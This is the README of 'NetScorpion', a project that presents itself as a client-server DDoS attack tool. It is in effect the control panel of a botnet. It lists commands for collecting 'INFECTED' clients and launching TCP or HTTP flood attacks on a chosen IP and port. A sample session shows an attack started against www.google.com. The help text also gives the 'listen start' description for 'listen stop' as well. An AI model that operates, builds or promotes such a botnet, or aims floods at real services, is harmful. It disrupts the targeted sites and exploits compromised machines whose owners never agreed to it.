# NetScorpion
A Client-Server DDoS Attack Project

```
listen start                                    Opens a listening port and starts listening for incomming connections.
listen stop                                     Opens a listening port and starts listening for incomming connections.
stop                                            Stops the server.
list client                                     Shows a list for all connected clients.
help                                            Shows this message.
attack start <ip> <port> <client/all> <method>  Starts a TCP attack for all connected clients ('list client') (methods: tcp/http)
attack stop                                     Stops current attack.
test connection                                 Tests all connections.
options list                                    Shows a list for all options (e.g. port, ip)
set <option> <value>                            Sets a global option. (e.g. 'set port 1234', 'set ip 127.0.0.1')
disconnect <ip:port/all>                        Disconnects specified client.
```

## Basic Usage:
```bash
$ listen start
Server is listening on port 2865.

$ list client
Connected Clients:

[CLIENT] INFECTED 127.0.0.1:62003

$ attack start http://www.google.com/ 80 http all
Attack started!
```
